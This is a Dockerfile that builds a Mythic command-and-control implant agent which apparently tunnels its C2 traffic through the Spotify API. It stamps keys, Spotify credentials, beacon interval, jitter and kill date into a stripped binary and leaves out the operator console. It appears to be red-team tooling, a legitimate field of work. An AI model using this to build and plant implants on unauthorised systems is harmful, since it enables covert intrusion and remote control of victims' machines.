# Reproducible cross-build for the Mythic "spotify" profile agent.
#
# IMPORTANT: -tags implantonly is REQUIRED — it excludes the operator
# console (internal/c2/operator.go, readline) from internal/c2.
#
# Build context must be the go/ module root:
#   docker build -f cmd/mythicagent/Dockerfile \
#     --build-arg TARGETOS=windows --build-arg TARGETARCH=amd64 \
#     --build-arg PAYLOAD_UUID=... --build-arg AES_KEY_B64=... \
#     --build-arg PASSPHRASE=... --build-arg SPOTIFY_USERNAME=... \
#     --build-arg SPOTIFY_CLIENT_ID=... --build-arg SPOTIFY_CLIENT_SECRET=... \
#     --build-arg SPOTIFY_REDIRECT_URI=... --build-arg SPOTIFY_TOKEN_FILE=... \
#     --build-arg INTERVAL=30 --build-arg JITTER=10 --build-arg KILL_DATE= \
#     --output type=local,dest=out .
FROM --platform=$BUILDPLATFORM golang:1.26-bookworm AS build
ARG TARGETOS=linux
ARG TARGETARCH=amd64

# Stamped config (see README.md; these map 1:1 to the -ldflags -X contract).
ARG PAYLOAD_UUID=""
ARG AES_KEY_B64=""
ARG PASSPHRASE=""
ARG SPOTIFY_USERNAME=""
ARG SPOTIFY_CLIENT_ID=""
ARG SPOTIFY_CLIENT_SECRET=""
ARG SPOTIFY_REDIRECT_URI=""
ARG SPOTIFY_TOKEN_FILE=""
ARG INTERVAL="30"
ARG JITTER="10"
ARG KILL_DATE=""
ARG EXTRA_TAGS=""

WORKDIR /src
COPY go.mod go.sum ./
RUN go mod download
COPY . .

RUN CGO_ENABLED=0 GOOS=${TARGETOS} GOARCH=${TARGETARCH} go build \
      -tags "implantonly ${EXTRA_TAGS}" \
      -trimpath \
      -ldflags "-s -w \
        -X main.PayloadUUID=${PAYLOAD_UUID} \
        -X main.AESKeyB64=${AES_KEY_B64} \
        -X main.Passphrase=${PASSPHRASE} \
        -X main.SpotifyUsername=${SPOTIFY_USERNAME} \
        -X main.SpotifyClientID=${SPOTIFY_CLIENT_ID} \
        -X main.SpotifyClientSecret=${SPOTIFY_CLIENT_SECRET} \
        -X main.SpotifyRedirectURI=${SPOTIFY_REDIRECT_URI} \
        -X main.SpotifyTokenFile=${SPOTIFY_TOKEN_FILE} \
        -X main.Interval=${INTERVAL} \
        -X main.Jitter=${JITTER} \
        -X main.KillDate=${KILL_DATE}" \
      -o /out/mythicagent ./cmd/mythicagent

FROM scratch
COPY --from=build /out/mythicagent /mythicagent
ENTRYPOINT ["/mythicagent"]
